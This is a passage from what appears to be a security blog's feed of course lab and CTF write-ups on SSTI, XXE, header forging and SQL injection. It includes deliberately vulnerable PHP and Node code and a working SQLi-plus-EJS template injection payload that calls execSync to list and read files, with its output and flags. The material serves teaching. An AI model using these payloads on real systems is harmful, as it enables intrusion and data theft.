&lt;p>Must change &lt;code>GET&lt;/code> method to &lt;code>POST&lt;/code> method and add &lt;code>Content-Type: application/x-www-form-urlencoded&lt;/code> in header&lt;/p></description></item><item><title>Simple Web 0x22(Lab - Pug)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/</guid><description>&lt;h1 id="simple-web-0x22lab---pug">
 Simple Web 0x22(Lab - Pug)
 &lt;a class="anchor" href="#simple-web-0x22lab---pug">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8008">http://h4ck3r.quest:8008&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-javascript=" data-lang="javascript=">const express = require(&amp;#39;express&amp;#39;);
const pug = require(&amp;#39;pug&amp;#39;);

const app = express();

const template = `
h1 Hello %NAME%
form(method=&amp;#39;GET&amp;#39; action=&amp;#39;/&amp;#39;)
 div
 label(for=&amp;#39;nickname&amp;#39;) Name:
 input#nickname(type=&amp;#39;text&amp;#39;, placeholder=&amp;#39;Nickname&amp;#39; name=&amp;#39;name&amp;#39;)
 button(type=&amp;#39;submit&amp;#39;) Submit 
 a(href=&amp;#39;/source&amp;#39;) Source Code
`;

app.get(&amp;#39;/&amp;#39;, (req, res) =&amp;gt; {
 const name = (req.query.name ?? &amp;#39;Anonymous&amp;#39;).toString();
 if (name.includes(&amp;#39;{&amp;#39;)) return res.send(&amp;#39;Nice try&amp;#39;);
 let html = pug.render(template.replace(&amp;#39;%NAME%&amp;#39;, name));
 res.set(&amp;#39;Content-Type&amp;#39;, &amp;#39;text/html&amp;#39;);
 res.send(html);
});

app.get(&amp;#34;/source&amp;#34;, (_, res) =&amp;gt; {
 res.sendFile(__filename);
});

app.listen(3000, () =&amp;gt; console.log(&amp;#39;:3000&amp;#39;));
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x23(Lab - XXE)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x14lab---xxe/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x14lab---xxe/</guid><description>&lt;h1 id="simple-web-0x23lab---xxe">
 Simple Web 0x23(Lab - XXE)
 &lt;a class="anchor" href="#simple-web-0x23lab---xxe">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8604/">http://h4ck3r.quest:8604/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.w3schools.com/xml/xml_tree.asp">XML Tree&lt;/a>
&lt;a href="https://www.w3schools.com/xml/xml_parser.asp">XML Parser&lt;/a>
&lt;a href="https://www.w3schools.com/xml/ajax_xmlhttprequest_response.asp">AJAX - Server Response&lt;/a>
&lt;a href="https://www.w3schools.com/xml/xml_dtd.asp">XML DTD&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://phper.shujuwajue.com/shu-zu/shu-ru-liu-php-input">输入流 php://input&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>php://input可以读取没有处理过的POST数据。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10217536">Day 18：Stream 概述&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>php://input
取得所有的 input 通常來源於 HTTP body，值得注意的是，由這個 Stream 取得的內容是 Raw Body，所以需要自行解析。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://www.digicentre.com.tw/industry_detail?id=38">來自外部的威脅-XXE漏洞攻擊成因&lt;/a>
:::spoiler XXE course lecture
&lt;img src="https://i.imgur.com/NsyIcdt.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/zYonfqc.png" alt="" />
:::
:::spoiler exploit type
&lt;img src="https://i.imgur.com/IJlFonF.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/N9VNyBC.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/uqPwH5H.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/j8WI9eQ.png" alt="" />
:::&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
 $xmlfile = urldecode(file_get_contents(&amp;#39;php://input&amp;#39;));
 if (!$xmlfile) die(show_source(__FILE__));

 $dom = new DOMDocument();
 $dom-&amp;gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
 $creds = simplexml_import_dom($dom);
 $user = $creds-&amp;gt;user;
 echo &amp;#34;You have logged in as user $user&amp;#34;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="exploit---xxe">
 Exploit - XXE
 &lt;a class="anchor" href="#exploit---xxe">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Normal Usage in this webpage&lt;/li>
&lt;/ol>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2></description></item><item><title>Simple Web 0x23(Lab - XXE)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/</guid><description>&lt;h1 id="simple-web-0x23lab---xxe">
 Simple Web 0x23(Lab - XXE)
 &lt;a class="anchor" href="#simple-web-0x23lab---xxe">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8604/">http://h4ck3r.quest:8604/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.w3schools.com/xml/xml_tree.asp">XML Tree&lt;/a>
&lt;a href="https://www.w3schools.com/xml/xml_parser.asp">XML Parser&lt;/a>
&lt;a href="https://www.w3schools.com/xml/ajax_xmlhttprequest_response.asp">AJAX - Server Response&lt;/a>
&lt;a href="https://www.w3schools.com/xml/xml_dtd.asp">XML DTD&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://phper.shujuwajue.com/shu-zu/shu-ru-liu-php-input">输入流 php://input&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>php://input可以读取没有处理过的POST数据。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10217536">Day 18：Stream 概述&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>php://input
取得所有的 input 通常來源於 HTTP body，值得注意的是，由這個 Stream 取得的內容是 Raw Body，所以需要自行解析。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://www.digicentre.com.tw/industry_detail?id=38">來自外部的威脅-XXE漏洞攻擊成因&lt;/a>
:::spoiler XXE course lecture
&lt;img src="https://i.imgur.com/NsyIcdt.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/zYonfqc.png" alt="" />
:::
:::spoiler exploit type
&lt;img src="https://i.imgur.com/IJlFonF.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/N9VNyBC.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/uqPwH5H.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/j8WI9eQ.png" alt="" />
:::&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
 $xmlfile = urldecode(file_get_contents(&amp;#39;php://input&amp;#39;));
 if (!$xmlfile) die(show_source(__FILE__));

 $dom = new DOMDocument();
 $dom-&amp;gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
 $creds = simplexml_import_dom($dom);
 $user = $creds-&amp;gt;user;
 echo &amp;#34;You have logged in as user $user&amp;#34;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="exploit---xxe">
 Exploit - XXE
 &lt;a class="anchor" href="#exploit---xxe">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Normal Usage in this webpage&lt;/li>
&lt;/ol>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2></description></item><item><title>Simple Web 0x24(Lab - how2http)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/</guid><description>&lt;h1 id="simple-web-0x24lab---how2http">
 Simple Web 0x24(Lab - how2http)
 &lt;a class="anchor" href="#simple-web-0x24lab---how2http">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">show_source&lt;/span>(&lt;span style="color:#66d9ef">__FILE__&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">include&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;flag.php&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#66d9ef">empty&lt;/span>($_SERVER[&lt;span style="color:#e6db74">&amp;#34;HTTP_CLIENT_IP&amp;#34;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ip &lt;span style="color:#f92672">=&lt;/span> $_SERVER[&lt;span style="color:#e6db74">&amp;#34;HTTP_CLIENT_IP&amp;#34;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#66d9ef">elseif&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#66d9ef">empty&lt;/span>($_SERVER[&lt;span style="color:#e6db74">&amp;#34;HTTP_X_FORWARDED_FOR&amp;#34;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ip &lt;span style="color:#f92672">=&lt;/span> $_SERVER[&lt;span style="color:#e6db74">&amp;#34;HTTP_X_FORWARDED_FOR&amp;#34;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ip &lt;span style="color:#f92672">=&lt;/span> $_SERVER[&lt;span style="color:#e6db74">&amp;#34;REMOTE_ADDR&amp;#34;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> ($_COOKIE[&lt;span style="color:#e6db74">&amp;#39;user&amp;#39;&lt;/span>] &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;admin&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Not admim&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>( $_SERVER[&lt;span style="color:#e6db74">&amp;#34;REQUEST_METHOD&amp;#34;&lt;/span>] &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;FLAG&amp;#34;&lt;/span> ) &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;u don&amp;#39;t need flag?&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> ($ip &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#e6db74">&amp;#34;127.0.0.1&amp;#34;&lt;/span>) &lt;span style="color:#66d9ef">echo&lt;/span> $FLAG;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;NOPE!&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>主要是參考之前寫過的&lt;a href="https://hackmd.io/@SBK6401/B135SD0w2">PicoCTF - Who are you?&lt;/a>和&lt;a href="https://hackmd.io/@SBK6401/Syct_Ol0i#Challenge-picobrowser%F0%9F%8D%B0">PicoCTF - Who are you?&lt;/a>，按照source code我們需要更改一些header讓他可以被forge然後bypass這些條件，首先是IP，他其實給的很寬鬆，還有X-Forwarded-For的header可以用，就直接==X-Forwarded-For: 127.0.0.1==；另外，cookie的user要等於admin→==Cookie: user=admin==；再來，request method要等於FLAG→==FLAG / HTTP/1.1==&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://hackmd.io/_uploads/H14qGKvrp.png" alt="圖片" />&lt;/p></description></item><item><title>Simple Web 0x41(2023 HW - Double Injection - FLAG1)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/</guid><description>&lt;h1 id="simple-web-0x412023-hw---double-injection---flag1">
 Simple Web 0x41(2023 HW - Double Injection - FLAG1)
 &lt;a class="anchor" href="#simple-web-0x412023-hw---double-injection---flag1">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Time Based SQLi
:::info
建議先在local side自架docker environment，debug比較方便；另外也推薦在local自架sqlite的環境，下語法或是debug也很方便
:::&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler init-db.js&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">require&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;fs&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">sqlite3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">require&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;sqlite3&amp;#39;&lt;/span>).&lt;span style="color:#a6e22e">verbose&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">FLAG1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fs&lt;/span>.&lt;span style="color:#a6e22e">readFileSync&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;/flag1.txt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;utf8&amp;#39;&lt;/span>).&lt;span style="color:#a6e22e">trim&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">sqlite3&lt;/span>.&lt;span style="color:#a6e22e">Database&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;/etc/db.sqlite3&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">db&lt;/span>.&lt;span style="color:#a6e22e">exec&lt;/span>(&lt;span style="color:#e6db74">`
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">DROP TABLE IF EXISTS users;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">CREATE TABLE db (
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> users JSON NOT NULL
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">INSERT INTO db(users) VALUES (&amp;#39;{
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;admin&amp;#34;: {
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;username&amp;#34;: &amp;#34;admin&amp;#34;,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;password&amp;#34;: &amp;#34;&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>&lt;span style="color:#a6e22e">FLAG1&lt;/span>&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> },
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;guest&amp;#34;: {
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;username&amp;#34;: &amp;#34;guest&amp;#34;,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;password&amp;#34;: &amp;#34;guest&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> }
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">}&amp;#39;);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">`&lt;/span>);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
:::spoiler Dockerfile&lt;/p></description></item><item><title>Simple Web 0x42(2023 HW - Double Injection - FLAG2)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x422023-hw---double-injection---flag2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x422023-hw---double-injection---flag2/</guid><description>&lt;h1 id="simple-web-0x422023-hw---double-injection---flag2">
 Simple Web 0x42(2023 HW - Double Injection - FLAG2)
 &lt;a class="anchor" href="#simple-web-0x422023-hw---double-injection---flag2">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Node JS ejs SSTI&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>呈上題&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題想了很久，因為我沒有跟影片，想說應該都是跟去年差不多或是在臺科的網頁安全一樣，但其實相關的payload就是在講義上，花了一整天寫的我be like:
&lt;img src="https://memeprod.ap-south-1.linodeobjects.com/user-template/7266c8627075418a7979b79481bf0f84.png" alt="" />
基本上就是連接前一題的思緒，既然我們知道admin的password也就是FLAG1，那麼我們就可以用前一題的payload:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-!" data-lang="!">admin.password&amp;#34;) as password, json_extract(users, &amp;#39;$.admin.password&amp;#39;) as password from db; -- #
&lt;/code>&lt;/pre>&lt;p>後面搭配簡單的XSS也是可以通的，原本想說可以利用XSS達到RCE，但就我之前和Kaibro的詢問，XSS應該沒有這麼powerful，所以我就往SSTI或command injection下手，後來經過@cs-otaku的提點才知道ejs有一個洞，也是上課有提到的SSTI控到RCE，當時看的文章是Huli大寫的，內容詳細說明了為甚麼會有這個洞以及該如何構造攻擊的payload，不過整體更複雜也算是需要客製化的題目才需要了解這麼多，這一題算是只要取得經典的payload就可以攻克，如果想要用動態看他跑得怎麼樣，可以用web storm跟，想知道整體的動態流程可以看&lt;a href="https://hackmd.io/@SBK6401/HkgkDNsPp">之前寫的文章&lt;/a>&lt;/p>
&lt;h2 id="exploit---ejs-ssti-rce">
 Exploit - Ejs SSTI RCE
 &lt;a class="anchor" href="#exploit---ejs-ssti-rce">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Payload 1:
&lt;ul>
&lt;li>Username:
&lt;pre tabindex="0">&lt;code class="language-!" data-lang="!">admin.password&amp;#34;) as password, json_extract(users, &amp;#39;$.admin.password&amp;#39;) as password from db; -- # &amp;lt;%= global.process.mainModule.require(&amp;#34;child_process&amp;#34;).execSync(&amp;#34;ls -al /&amp;#34;).toString() %&amp;gt;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Password: &lt;code>FLAG{sqlite_js0n_inject!on}&lt;/code>&lt;/li>
&lt;li>Result:
&lt;pre tabindex="0">&lt;code>total	76	
drwxr-xr-x	1	root	root	4096	Dec	18	18:54	.	
drwxr-xr-x	1	root	root	4096	Dec	18	18:54	..	
-rwxr-xr-x	1	root	root	0		Dec	18	18:54	.dockerenv	
drwxr-xr-x	1	root	root	4096	Dec	11	18:36	bin	
drwxr-xr-x	5	root	root	340		Dec	18	18:54	dev	
drwxr-xr-x	1	root	root	4096	Dec	18	18:54	etc	
-rw-r--r--	1	root	root	28		Dec	18	17:15	flag1.txt	
-rw-r--r--	1	root	root	23		Dec	18	17:15	flag2-1PRmDsTXoo3uPCdq.txt	
drwxr-xr-x	1	root	root	4096	Dec	18	17:15	home	
drwxr-xr-x	1	root	root	4096	Dec	11	18:36	lib	
drwxr-xr-x	5	root	root	4096	Dec	7	09:43	media	
drwxr-xr-x	2	root	root	4096	Dec	7	09:43	mnt	
drwxr-xr-x	1	root	root	4096	Dec	11	18:36	opt	
dr-xr-xr-x	497	root	root	0		Dec	18	18:54	proc	
drwx------	1	root	root	4096	Dec	11	18:36	root	
drwxr-xr-x	2	root	root	4096	Dec	7	09:43	run	
drwxr-xr-x	2	root	root	4096	Dec	7	09:43	sbin	
drwxr-xr-x	2	root	root	4096	Dec	7	09:43	srv	
dr-xr-xr-x	13	root	root	0		Dec	18	18:54	sys	
drwxrwxrwt	1	root	root	4096	Dec	22	17:16	tmp	
drwxr-xr-x	1	root	root	4096	Dec	18	13:27	usr	
drwxr-xr-x	12	root	root	4096	Dec	7	09:43	var	
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Payload 2:
&lt;ul>
&lt;li>Username:
&lt;pre tabindex="0">&lt;code class="language-!" data-lang="!">admin.password&amp;#34;) as password, json_extract(users, &amp;#39;$.admin.password&amp;#39;) as password from db; -- # &amp;lt;%= global.process.mainModule.require(&amp;#34;child_process&amp;#34;).execSync(&amp;#34;cat /flag2-1PRmDsTXoo3uPCdq.txt&amp;#34;).toString() %&amp;gt;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Password: &lt;code>FLAG{sqlite_js0n_inject!on}&lt;/code>&lt;/li>
&lt;li>Result: &lt;code>FLAG{ezzzzz_sqli2ssti}&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>Flag: &lt;code>FLAG{ezzzzz_sqli2ssti}&lt;/code>&lt;/p></description></item><item><title>Simple Welcome - 0x04(Lab - Script)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/simple-welcome---0x04lab---script/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/simple-welcome---0x04lab---script/</guid><description>&lt;h1 id="simple-welcome---0x04lab---script">
 Simple Welcome - 0x04(Lab - Script)
 &lt;a class="anchor" href="#simple-welcome---0x04lab---script">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://pyscript.ctf.zoolab.org/">https://pyscript.ctf.zoolab.org/&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
 if(!isset($_FILES[&amp;#34;file&amp;#34;]))
 highlight_file(__file__) &amp;amp;&amp;amp; die();
 $flag = file_get_contents(&amp;#39;/flag&amp;#39;);
 $node = @`node {$_FILES[&amp;#34;file&amp;#34;][&amp;#34;tmp_name&amp;#34;]} 2&amp;gt;&amp;amp;1`;
 $python = @`python3 {$_FILES[&amp;#34;file&amp;#34;][&amp;#34;tmp_name&amp;#34;]} 2&amp;gt;&amp;amp;1`;
 if($flag === $node &amp;amp;&amp;amp; $flag === $python)
 echo &amp;#39;Here is your Flag: &amp;#39;.$flag;
 else
 echo &amp;#39;Fail :(&amp;#39;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;h3 id="analysis">
 Analysis
 &lt;a class="anchor" href="#analysis">#&lt;/a>
&lt;/h3>
&lt;p>Must write a script that can be executed in python and node language simultaneously.&lt;/p></description></item><item><title>Simple Welcome 0x01(Lab - Let's meet at class)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/simple-welcome-0x01lab---lets-meet-at-class/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/simple-welcome-0x01lab---lets-meet-at-class/</guid><description>&lt;h1 id="simple-welcome-0x01lab---lets-meet-at-class">
 Simple Welcome 0x01(Lab - Let&amp;rsquo;s meet at class)
 &lt;a class="anchor" href="#simple-welcome-0x01lab---lets-meet-at-class">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;p>Crypto part of homework 0. The key space is $10^{15}$. I used my supercomputer(i5 7th gen) to solve it in about 10 minutes. It&amp;rsquo;s impossible for you guys to enumerate all the keys in 2 weeks, or maybe you can&amp;hellip; (Use &lt;code>pip3 install pycryptodome&lt;/code> to install Crypto)&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source&lt;/p>
